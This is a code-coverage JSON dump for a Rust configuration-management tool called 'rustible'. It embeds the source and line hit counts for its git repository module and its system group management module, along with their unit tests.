}\n\n        // Validate depth if provided\n        if let Some(depth) = params.get_u32(\"depth\")? {\n            if depth == 0 {\n                return Err(ModuleError::InvalidParameter(\n                    \"depth must be greater than 0\".to_string(),\n                ));\n            }\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Extract parameters\n        let repo = params.get_string_required(\"repo\")?;\n        let dest = params.get_string_required(\"dest\")?;\n        let version = params.get_string(\"version\")?;\n        let depth = params.get_u32(\"depth\")?;\n        let update = params.get_bool_or(\"update\", true);\n\n        // Check if git is installed\n        if !Self::check_git_installed()? {\n            return Err(ModuleError::ExecutionFailed(\n                \"git is not installed on the system\".to_string(),\n            ));\n        }\n\n        // Check if destination exists and is a git repo\n        let is_repo = Self::is_git_repo(\u0026dest);\n\n        if !is_repo {\n            // Repository doesn't exist, clone it\n            if context.check_mode {\n                return Ok(ModuleOutput::changed(format!(\n                    \"Would clone repository '{}' to '{}'\",\n                    repo, dest\n                ))\n                .with_diff(Diff::new(\"repository absent\", format!(\"clone {}\", repo))));\n            }\n\n            return Self::clone_repo(\u0026repo, \u0026dest, version.as_deref(), depth, context);\n        }\n\n        // Repository exists - check if it's the same repo\n        let current_remote = Self::get_remote_url(\u0026dest)?;\n        if let Some(current) = current_remote {\n            if current != repo {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Destination '{}' is a git repository for '{}', not '{}'\",\n                    dest, current, repo\n                )));\n            }\n        } else {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Destination '{}' exists but is not a valid git repository\",\n                dest\n            )));\n        }\n\n        // Repository exists and is correct, update if requested\n        if update {\n            let (changed, new_version) = Self::update_repo(\u0026dest, version.as_deref(), context)?;\n\n            if changed {\n                Ok(ModuleOutput::changed(format!(\n                    \"Updated repository to version '{}'\",\n                    new_version\n                ))\n                .with_data(\"version\", serde_json::json!(new_version)))\n            } else {\n                Ok(\n                    ModuleOutput::ok(format!(\"Repository already at version '{}'\", new_version))\n                        .with_data(\"version\", serde_json::json!(new_version)),\n                )\n            }\n        } else {\n            // Just check current version\n            let current_version =\n                Self::get_current_version(\u0026dest)?.unwrap_or_else(|| \"unknown\".to_string());\n\n            Ok(ModuleOutput::ok(format!(\n                \"Repository exists at version '{}'\",\n                current_version\n            ))\n            .with_data(\"version\", serde_json::json!(current_version)))\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let dest = params.get_string_required(\"dest\")?;\n        let repo = params.get_string_required(\"repo\")?;\n\n        let is_repo = Self::is_git_repo(\u0026dest);\n\n        if !is_repo {\n            Ok(Some(Diff::new(\n                \"repository absent\",\n                format!(\"clone {}\", repo),\n            )))\n        } else {\n            let current_version =\n                Self::get_current_version(\u0026dest)?.unwrap_or_else(|| \"unknown\".to_string());\n            let version = params\n                .get_string(\"version\")?\n                .unwrap_or_else(|| \"latest\".to_string());\n\n            Ok(Some(Diff::new(\n                format!(\"version: {}\", current_version),\n                format!(\"version: {}\", version),\n            )))\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_git_module_validate_params() {\n        let module = GitModule;\n\n        // Missing repo\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"dest\".to_string(), serde_json::json!(\"/tmp/test\"));\n        assert!(module.validate_params(\u0026params).is_err());\n\n        // Missing dest\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"repo\".to_string(),\n            serde_json::json!(\"https://github.com/test/repo\"),\n        );\n        assert!(module.validate_params(\u0026params).is_err());\n\n        // Valid params\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"repo\".to_string(),\n            serde_json::json!(\"https://github.com/test/repo\"),\n        );\n        params.insert(\"dest\".to_string(), serde_json::json!(\"/tmp/test\"));\n        assert!(module.validate_params(\u0026params).is_ok());\n    }\n\n    #[test]\n    fn test_git_module_validate_depth() {\n        let module = GitModule;\n\n        // Invalid depth (0)\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"repo\".to_string(),\n            serde_json::json!(\"https://github.com/test/repo\"),\n        );\n        params.insert(\"dest\".to_string(), serde_json::json!(\"/tmp/test\"));\n        params.insert(\"depth\".to_string(), serde_json::json!(0));\n        assert!(module.validate_params(\u0026params).is_err());\n\n        // Valid depth\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"repo\".to_string(),\n            serde_json::json!(\"https://github.com/test/repo\"),\n        );\n        params.insert(\"dest\".to_string(), serde_json::json!(\"/tmp/test\"));\n        params.insert(\"depth\".to_string(), serde_json::json!(1));\n        assert!(module.validate_params(\u0026params).is_ok());\n    }\n\n    #[test]\n    fn test_git_module_check_mode() {\n        let module = GitModule;\n        let temp = TempDir::new().unwrap();\n        let dest_path = temp.path().join(\"test-repo\");\n\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"repo\".to_string(),\n            serde_json::json!(\"https://github.com/test/repo\"),\n        );\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest_path.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would clone\"));\n        assert!(!dest_path.exists()); // Should not be created in check mode\n    }\n\n    #[test]\n    fn test_git_module_name_and_description() {\n        let module = GitModule;\n        assert_eq!(module.name(), \"git\");\n        assert!(!module.description().is_empty());\n    }\n\n    #[test]\n    fn test_git_module_required_params() {\n        let module = GitModule;\n        let required = module.required_params();\n        assert_eq!(required.len(), 2);\n        assert!(required.contains(\u0026\"repo\"));\n        assert!(required.contains(\u0026\"dest\"));\n    }\n}\n","traces":[{"line":18,"address":[29693568,29694081,29694087],"length":1,"stats":{"Line":1}},{"line":19,"address":[29693585,29693748,29693823],"length":1,"stats":{"Line":2}},{"line":22,"address":[29694100,29693728,29693961,29693794,29693644],"length":1,"stats":{"Line":2}},{"line":23,"address":[29694014],"length":1,"stats":{"Line":1}},{"line":27,"address":[29688688,29688945,29688939],"length":1,"stats":{"Line":1}},{"line":28,"address":[29688710,29688903],"length":1,"stats":{"Line":2}},{"line":32,"address":[29695130,29695136,29694128],"length":1,"stats":{"Line":0}},{"line":33,"address":[29694503,29694171,29694422],"length":1,"stats":{"Line":0}},{"line":35,"address":[29694289],"length":1,"stats":{"Line":0}},{"line":39,"address":[32188768,32189023,32189017],"length":1,"stats":{"Line":0}},{"line":40,"address":[32188795,32188863],"length":1,"stats":{"Line":0}},{"line":43,"address":[29694715,29694816],"length":1,"stats":{"Line":0}},{"line":44,"address":[29695026],"length":1,"stats":{"Line":0}},{"line":45,"address":[29694818,29694977,29694875],"length":1,"stats":{"Line":0}},{"line":48,"address":[29694749],"length":1,"stats":{"Line":0}},{"line":53,"address":[29693525,29693531,29692480],"length":1,"stats":{"Line":0}},{"line":54,"address":[29692896,29692815,29692523],"length":1,"stats":{"Line":0}},{"line":56,"address":[29692653],"length":1,"stats":{"Line":0}},{"line":61,"address":[29692792],"length":1,"stats":{"Line":0}},{"line":62,"address":[32188363,32188431],"length":1,"stats":{"Line":0}},{"line":65,"address":[29693108,29693209],"length":1,"stats":{"Line":0}},{"line":66,"address":[29693421],"length":1,"stats":{"Line":0}},{"line":67,"address":[29693370,29693211,29693268],"length":1,"stats":{"Line":0}},{"line":70,"address":[29693142],"length":1,"stats":{"Line":0}},{"line":75,"address":[29688661,29687136,29688415],"length":1,"stats":{"Line":0}},{"line":82,"address":[29687271],"length":1,"stats":{"Line":0}},{"line":83,"address":[29687306],"length":1,"stats":{"Line":0}},{"line":85,"address":[29687369],"length":1,"stats":{"Line":0}},{"line":86,"address":[29687398,29687463],"length":1,"stats":{"Line":0}},{"line":89,"address":[29687430,29687512],"length":1,"stats":{"Line":0}},{"line":90,"address":[29687637,29687554],"length":1,"stats":{"Line":0}},{"line":93,"address":[29687586,29687651],"length":1,"stats":{"Line":0}},{"line":95,"address":[29687674,29687821,29688656],"length":1,"stats":{"Line":0}},{"line":96,"address":[32187451,32187519],"length":1,"stats":{"Line":0}},{"line":99,"address":[29687982,29688037],"length":1,"stats":{"Line":0}},{"line":100,"address":[29688043,29688136],"length":1,"stats":{"Line":0}},{"line":101,"address":[29688286],"length":1,"stats":{"Line":0}},{"line":102,"address":[29688155,29688230],"length":1,"stats":{"Line":0}},{"line":103,"address":[29688250],"length":1,"stats":{"Line":0}},{"line":107,"address":[29688421,29688080],"length":1,"stats":{"Line":0}},{"line":114,"address":[29692426,29688960,29690547],"length":1,"stats":{"Line":0}},{"line":120,"address":[29689047],"length":1,"stats":{"Line":0}},{"line":123,"address":[29689315],"length":1,"stats":{"Line":0}},{"line":124,"address":[29689362],"length":1,"stats":{"Line":0}},{"line":128,"address":[29689913,29689324,29689829],"length":1,"stats":{"Line":0}},{"line":130,"address":[29689678],"length":1,"stats":{"Line":0}},{"line":134,"address":[29690066,29692407,29689613,29689806,29689881],"length":1,"stats":{"Line":0}},{"line":136,"address":[29690125],"length":1,"stats":{"Line":0}},{"line":137,"address":[29690440],"length":1,"stats":{"Line":0}},{"line":138,"address":[29690160,29690261],"length":1,"stats":{"Line":0}},{"line":139,"address":[29690284],"length":1,"stats":{"Line":0}},{"line":144,"address":[29690569,29690189],"length":1,"stats":{"Line":0}},{"line":145,"address":[29690958,29690607,29690874],"length":1,"stats":{"Line":0}},{"line":147,"address":[29690737],"length":1,"stats":{"Line":0}},{"line":149,"address":[29690799],"length":1,"stats":{"Line":0}},{"line":151,"address":[29690851],"length":1,"stats":{"Line":0}},{"line":152,"address":[32187791,32187723],"length":1,"stats":{"Line":0}},{"line":155,"address":[29691170],"length":1,"stats":{"Line":0}},{"line":156,"address":[29691417],"length":1,"stats":{"Line":0}},{"line":157,"address":[29691256,29691199],"length":1,"stats":{"Line":0}},{"line":158,"address":[29691276],"length":1,"stats":{"Line":0}},{"line":163,"address":[29691222,29691615,29691528],"length":1,"stats":{"Line":0}},{"line":164,"address":[29691578],"length":1,"stats":{"Line":0}},{"line":166,"address":[29691783],"length":1,"stats":{"Line":0}},{"line":173,"address":[32187968,32187980],"length":1,"stats":{"Line":0}},{"line":176,"address":[29692188,29692101],"length":1,"stats":{"Line":0}},{"line":177,"address":[29692198],"length":1,"stats":{"Line":0}},{"line":182,"address":[29680064],"length":1,"stats":{"Line":1}},{"line":186,"address":[29677072],"length":1,"stats":{"Line":1}},{"line":190,"address":[29677104],"length":1,"stats":{"Line":0}},{"line":194,"address":[29677120],"length":1,"stats":{"Line":1}},{"line":198,"address":[29677152],"length":1,"stats":{"Line":1}},{"line":200,"address":[29677198],"length":1,"stats":{"Line":1}},{"line":201,"address":[29677285],"length":1,"stats":{"Line":1}},{"line":203,"address":[29677241],"length":1,"stats":{"Line":1}},{"line":204,"address":[29677495],"length":1,"stats":{"Line":1}},{"line":208,"address":[29677631,29677403],"length":1,"stats":{"Line":1}},{"line":209,"address":[29677777],"length":1,"stats":{"Line":1}},{"line":210,"address":[29677836],"length":1,"stats":{"Line":1}},{"line":211,"address":[29677805],"length":1,"stats":{"Line":1}},{"line":216,"address":[29677787],"length":1,"stats":{"Line":1}},{"line":219,"address":[29680528,29683018,29686249],"length":1,"stats":{"Line":1}},{"line":225,"address":[29680620],"length":1,"stats":{"Line":1}},{"line":226,"address":[29686247,29680912,29680999],"length":1,"stats":{"Line":2}},{"line":227,"address":[29686226,29681180,29681267],"length":1,"stats":{"Line":2}},{"line":228,"address":[29681448,29686202,29681535],"length":1,"stats":{"Line":2}},{"line":229,"address":[29681694],"length":1,"stats":{"Line":1}},{"line":232,"address":[29681749,29686197],"length":1,"stats":{"Line":1}},{"line":233,"address":[29681977],"length":1,"stats":{"Line":0}},{"line":234,"address":[29681904],"length":1,"stats":{"Line":0}},{"line":239,"address":[29682142,29681943],"length":1,"stats":{"Line":2}},{"line":241,"address":[29682175],"length":1,"stats":{"Line":1}},{"line":243,"address":[29682187],"length":1,"stats":{"Line":1}},{"line":244,"address":[29682271,29682977,29682537,29682922],"length":1,"stats":{"Line":4}},{"line":248,"address":[29683008,29682954,29682746,29682719],"length":1,"stats":{"Line":2}},{"line":251,"address":[29682357,29682240],"length":1,"stats":{"Line":0}},{"line":255,"address":[29683048,29686192,29682206],"length":1,"stats":{"Line":0}},{"line":256,"address":[29683284],"length":1,"stats":{"Line":0}},{"line":257,"address":[29683478,29683361],"length":1,"stats":{"Line":0}},{"line":258,"address":[29683514,29685613],"length":1,"stats":{"Line":0}},{"line":264,"address":[29683400,29685916],"length":1,"stats":{"Line":0}},{"line":271,"address":[29683657],"length":1,"stats":{"Line":0}},{"line":272,"address":[29684431,29685608,29683696],"length":1,"stats":{"Line":0}},{"line":274,"address":[29684736,29685533],"length":1,"stats":{"Line":0}},{"line":275,"address":[29684783,29685448,29685215,29685515],"length":1,"stats":{"Line":0}},{"line":279,"address":[29685346,29685598,29685373,29685456],"length":1,"stats":{"Line":0}},{"line":282,"address":[29684748,29684857,29685090],"length":1,"stats":{"Line":0}},{"line":283,"address":[29685098,29685015,29685205,29684988],"length":1,"stats":{"Line":0}},{"line":288,"address":[29683671,29683734,29684396],"length":1,"stats":{"Line":0}},{"line":291,"address":[29684240,29683936,29684327,29684007],"length":1,"stats":{"Line":0}},{"line":295,"address":[29684248,29684165,29684386,29684138],"length":1,"stats":{"Line":0}},{"line":299,"address":[29680502,29680096,29680496],"length":1,"stats":{"Line":1}},{"line":304,"address":[29680432],"length":1,"stats":{"Line":1}},{"line":307,"address":[29680042,29677968,29679981],"length":1,"stats":{"Line":0}},{"line":308,"address":[29678022],"length":1,"stats":{"Line":0}},{"line":309,"address":[29678330,29678246,29680040],"length":1,"stats":{"Line":0}},{"line":311,"address":[29678505,29678576],"length":1,"stats":{"Line":0}},{"line":313,"address":[29678603],"length":1,"stats":{"Line":0}},{"line":314,"address":[29678766],"length":1,"stats":{"Line":0}},{"line":316,"address":[29678615,29678666],"length":1,"stats":{"Line":0}},{"line":319,"address":[29678889,29678647,29680025],"length":1,"stats":{"Line":0}},{"line":321,"address":[29679172,29679253],"length":1,"stats":{"Line":0}},{"line":323,"address":[29679310],"length":1,"stats":{"Line":0}},{"line":325,"address":[29679703,29679755],"length":1,"stats":{"Line":0}},{"line":326,"address":[29679348,29679419],"length":1,"stats":{"Line":0}},{"line":327,"address":[29679535,29679603],"length":1,"stats":{"Line":0}}],"covered":33,"coverable":126},{"path":["/","home","artur","Repositories","rustible","src","modules","group.rs"],"content":"//! Group module - Group management\n//!\n//! This module manages groups on the system.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{Connection, ExecuteOptions};\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse tokio::runtime::Handle;\n\n/// Desired state for a group\n#[derive(Debug, Clone, PartialEq)]\npub enum GroupState {\n    Present,\n    Absent,\n}\n\nimpl GroupState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" =\u003e Ok(GroupState::Present),\n            \"absent\" =\u003e Ok(GroupState::Absent),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Information about a group\n#[derive(Debug, Clone)]\npub struct GroupInfo {\n    pub name: String,\n    pub gid: u32,\n    pub members: Vec\u003cString\u003e,\n}\n\n/// Module for group management\npub struct GroupModule;\n\nimpl GroupModule {\n    /// Get execution options with become support if needed\n    fn get_exec_options(context: \u0026ModuleContext) -\u003e ExecuteOptions {\n        let mut options = ExecuteOptions::new();\n        if context.r#become {\n            options = options.with_escalation(context.become_user.clone());\n            if let Some(ref method) = context.become_method {\n                options.escalate_method = Some(method.clone());\n            }\n        }\n        options\n    }\n\n    /// Execute a command via connection\n    fn execute_command(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        command: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let options = Self::get_exec_options(context);\n\n        // Use tokio runtime to execute async command\n        let result = Handle::current()\n            .block_on(async { connection.execute(command, Some(options)).await })\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Connection error: {}\", e)))?;\n\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Check if a group exists via connection\n    fn group_exists_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let command = format!(\"getent group {}\", shell_escape(name));\n        let (success, _, _) = Self::execute_command(connection, \u0026command, context)?;\n        Ok(success)\n    }\n\n    /// Get group info via connection by parsing /etc/group\n    fn get_group_info_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cOption\u003cGroupInfo\u003e\u003e {\n        // Use getent to get group info\n        let command = format!(\"getent group {}\", shell_escape(name));\n        let (success, stdout, _) = Self::execute_command(connection, \u0026command, context)?;\n\n        if !success || stdout.trim().is_empty() {\n            return Ok(None);\n        }\n\n        // Parse group line: name:x:gid:members\n        let parts: Vec\u003c\u0026str\u003e = stdout.trim().split(':').collect();\n        if parts.len() \u003c 4 {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Invalid group entry for group '{}'\",\n                name\n            )));\n        }\n\n        let gid = parts[2].parse().unwrap_or(0);\n        let members = if parts[3].is_empty() {\n            Vec::new()\n        } else {\n            parts[3].split(',').map(|s| s.to_string()).collect()\n        };\n\n        Ok(Some(GroupInfo {\n            name: parts[0].to_string(),\n            gid,\n            members,\n        }))\n    }\n\n    /// Create a group via connection\n    fn create_group_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        gid: Option\u003cu32\u003e,\n        system: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let mut cmd_parts = vec![\"groupadd\".to_string()];\n\n        if let Some(gid) = gid {\n            cmd_parts.push(\"-g\".to_string());\n            cmd_parts.push(gid.to_string());\n        }\n\n        if system {\n            cmd_parts.push(\"-r\".to_string());\n        }\n\n        cmd_parts.push(shell_escape(name));\n\n        let command = cmd_parts.join(\" \");\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n\n    /// Modify a group via connection\n    fn modify_group_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        gid: Option\u003cu32\u003e,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let current = Self::get_group_info_via_connection(connection, name, context)?\n            .ok_or_else(|| ModuleError::ExecutionFailed(format!(\"Group '{}' not found\", name)))?;\n\n        let mut needs_change = false;\n        let mut cmd_parts = vec![\"groupmod\".to_string()];\n\n        if let Some(gid) = gid {\n            if current.gid != gid {\n                cmd_parts.push(\"-g\".to_string());\n                cmd_parts.push(gid.to_string());\n                needs_change = true;\n            }\n        }\n\n        if !needs_change {\n            return Ok(false);\n        }\n\n        cmd_parts.push(shell_escape(name));\n\n        let command = cmd_parts.join(\" \");\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(true)\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n\n    /// Delete a group via connection\n    fn delete_group_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let command = format!(\"groupdel {}\", shell_escape(name));\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n}\n\nimpl Module for GroupModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"group\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage groups\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let connection = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"Group module requires a connection for remote execution\".to_string(),\n            )\n        })?;\n\n        let name = params.get_string_required(\"name\")?;\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = GroupState::from_str(\u0026state_str)?;\n\n        let gid = params.get_u32(\"gid\")?;\n        let system = params.get_bool_or(\"system\", false);\n\n        let group_exists = Self::group_exists_via_connection(connection, \u0026name, context)?;\n\n        match state {\n            GroupState::Absent =\u003e {\n                if !group_exists {\n                    return Ok(ModuleOutput::ok(format!(\"Group '{}' already absent\", name)));\n                }\n\n                if context.check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would remove group '{}'\",\n                        name\n                    )));\n                }\n\n                Self::delete_group_via_connection(connection, \u0026name, context)?;\n                Ok(ModuleOutput::changed(format!(\"Removed group '{}'\", name)))\n            }\n\n            GroupState::Present =\u003e {\n                let mut changed = false;\n                let mut messages = Vec::new();\n\n                if !group_exists {\n                    if context.check_mode {\n                        return Ok(ModuleOutput::changed(format!(\n                            \"Would create group '{}'\",\n                            name\n                        )));\n                    }\n\n                    Self::create_group_via_connection(connection, \u0026name, gid, system, context)?;\n                    changed = true;\n                    messages.push(format!(\"Created group '{}'\", name));\n                } else {\n                    // Modify existing group\n                    if context.check_mode {\n                        // Check if modification would be needed\n                        if let Some(desired_gid) = gid {\n                            if let Some(info) =\n                                Self::get_group_info_via_connection(connection, \u0026name, context)?\n                            {\n                                if info.gid != desired_gid {\n                                    return Ok(ModuleOutput::changed(format!(\n                                        \"Would modify group '{}'\",\n                                        name\n                                    )));\n                                }\n                            }\n                        }\n                        return Ok(ModuleOutput::ok(format!(\n                            \"Group '{}' is in desired state\",\n                            name\n                        )));\n                    }\n\n                    let modified =\n                        Self::modify_group_via_connection(connection, \u0026name, gid, context)?;\n\n                    if modified {\n                        changed = true;\n                        messages.push(format!(\"Modified group '{}'\", name));\n                    }\n                }\n\n                // Get final group info\n                let group_info = Self::get_group_info_via_connection(connection, \u0026name, context)?;\n                let mut data = HashMap::new();\n\n                if let Some(info) = group_info {\n                    data.insert(\"gid\".to_string(), serde_json::json!(info.gid));\n                    data.insert(\"members\".to_string(), serde_json::json!(info.members));\n                }\n\n                let msg = if messages.is_empty() {\n                    format!(\"Group '{}' is in desired state\", name)\n                } else {\n                    messages.join(\". \")\n                };\n\n                let mut output = if changed {\n                    ModuleOutput::changed(msg)\n                } else {\n                    ModuleOutput::ok(msg)\n                };\n\n                for (k, v) in data {\n                    output = output.with_data(k, v);\n                }\n\n                Ok(output)\n            }\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let connection = match context.connection.as_ref() {\n            Some(c) =\u003e c,\n            None =\u003e return Ok(None),\n        };\n\n        let name = params.get_string_required(\"name\")?;\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = GroupState::from_str(\u0026state_str)?;\n\n        let group_info = Self::get_group_info_via_connection(connection, \u0026name, context)?;\n\n        let before = if let Some(info) = \u0026group_info {\n            format!(\n                \"group: {}\\ngid: {}\\nmembers: {}\",\n                info.name,\n                info.gid,\n                info.members.join(\",\")\n            )\n        } else {\n            \"group: (absent)\".to_string()\n        };\n\n        let after = match state {\n            GroupState::Absent =\u003e \"group: (absent)\".to_string(),\n            GroupState::Present =\u003e {\n                if group_info.is_some() {\n                    // Would need to compute differences based on params\n                    before.clone()\n                } else {\n                    format!(\"group: {} (will be created)\", name)\n                }\n            }\n        };\n\n        if before == after {\n            Ok(None)\n        } else {\n            Ok(Some(Diff::new(before, after)))\n        }\n    }\n}\n\n/// Escape a string for safe use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Simple escape: wrap in single quotes and escape any single quotes\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')\n    {\n        s.to_string()\n    } else {\n        format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_group_state_from_str() {\n        assert_eq!(\n            GroupState::from_str(\"present\").unwrap(),\n            GroupState::Present\n        );\n        assert_eq!(GroupState::from_str(\"absent\").unwrap(), GroupState::Absent);\n        assert!(GroupState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_shell_escape() {\n        assert_eq!(shell_escape(\"simple\"), \"simple\");\n        assert_eq!(shell_escape(\"with space\"), \"'with space'\");\n        assert_eq!(shell_escape(\"with'quote\"), \"'with'\\\\''quote'\");\n    }\n\n    #[test]\n    fn test_group_module_name() {\n        let module = GroupModule;\n        assert_eq!(module.name(), \"group\");\n    }\n\n    #[test]\n    fn test_group_module_classification() {\n        let module = GroupModule;\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n    }\n\n    #[test]\n    fn test_group_module_required_params() {\n        let module = GroupModule;\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n}\n","traces":[{"line":22,"address":[29968480,29969017,29969023],"length":1,"stats":{"Line":1}},{"line":23,"address":[29968507,29968609],"length":1,"stats":{"Line":2}},{"line":24,"address":[29968696,29968625],"length":1,"stats":{"Line":2}},{"line":25,"address":[29968668,29968765,29968722],"length":1,"stats":{"Line":3}},{"line":26,"address":[29968733,29968787],"length":1,"stats":{"Line":2}},{"line":47,"address":[29970724,29970048,29970845],"length":1,"stats":{"Line":0}},{"line":48,"address":[29970078],"length":1,"stats":{"Line":0}},{"line":49,"address":[29970133],"length":1,"stats":{"Line":0}},{"line":50,"address":[29970714,29970207,29970286],"length":1,"stats":{"Line":0}},{"line":51,"address":[29970418,29970701],"length":1,"stats":{"Line":0}},{"line":52,"address":[29970532,29970580,29970472],"length":1,"stats":{"Line":0}},{"line":55,"address":[29970147],"length":1,"stats":{"Line":0}},{"line":59,"address":[29969040,29970021,29969986],"length":1,"stats":{"Line":0}},{"line":64,"address":[29969117],"length":1,"stats":{"Line":0}},{"line":67,"address":[29969143,29969237,29969441,29969522],"length":1,"stats":{"Line":0}},{"line":68,"address":[29969253],"length":1,"stats":{"Line":0}},{"line":69,"address":[29969992,29969675,29969358,29969490],"length":1,"stats":{"Line":0}},{"line":71,"address":[29969739],"length":1,"stats":{"Line":0}},{"line":75,"address":[29973488,29974230,29974224],"length":1,"stats":{"Line":0}},{"line":80,"address":[29973586],"length":1,"stats":{"Line":0}},{"line":81,"address":[29973783,29973869],"length":1,"stats":{"Line":0}},{"line":82,"address":[29974168],"length":1,"stats":{"Line":0}},{"line":86,"address":[29976368,29978315,29978575],"length":1,"stats":{"Line":0}},{"line":92,"address":[29976439],"length":1,"stats":{"Line":0}},{"line":93,"address":[29978573,29976793,29976686],"length":1,"stats":{"Line":0}},{"line":95,"address":[29977176,29977239],"length":1,"stats":{"Line":0}},{"line":96,"address":[29977190],"length":1,"stats":{"Line":0}},{"line":100,"address":[29977338],"length":1,"stats":{"Line":0}},{"line":101,"address":[29977516,29977443],"length":1,"stats":{"Line":0}},{"line":102,"address":[29977566,29978321],"length":1,"stats":{"Line":0}},{"line":108,"address":[29977601,29977522],"length":1,"stats":{"Line":0}},{"line":109,"address":[29977701],"length":1,"stats":{"Line":0}},{"line":110,"address":[29977806,29977944],"length":1,"stats":{"Line":0}},{"line":112,"address":[29977770,29977830],"length":1,"stats":{"Line":0}},{"line":115,"address":[29978065],"length":1,"stats":{"Line":0}},{"line":116,"address":[29977909,29977995],"length":1,"stats":{"Line":0}},{"line":118,"address":[29978033],"length":1,"stats":{"Line":0}},{"line":123,"address":[29970880,29972363,29972401],"length":1,"stats":{"Line":0}},{"line":130,"address":[29970979,29971236,29972414],"length":1,"stats":{"Line":0}},{"line":132,"address":[29971222,29971249],"length":1,"stats":{"Line":0}},{"line":133,"address":[29971260,29971346],"length":1,"stats":{"Line":0}},{"line":134,"address":[29971370],"length":1,"stats":{"Line":0}},{"line":137,"address":[29971295],"length":1,"stats":{"Line":0}},{"line":138,"address":[29971451],"length":1,"stats":{"Line":0}},{"line":141,"address":[29971444,29971508],"length":1,"stats":{"Line":0}},{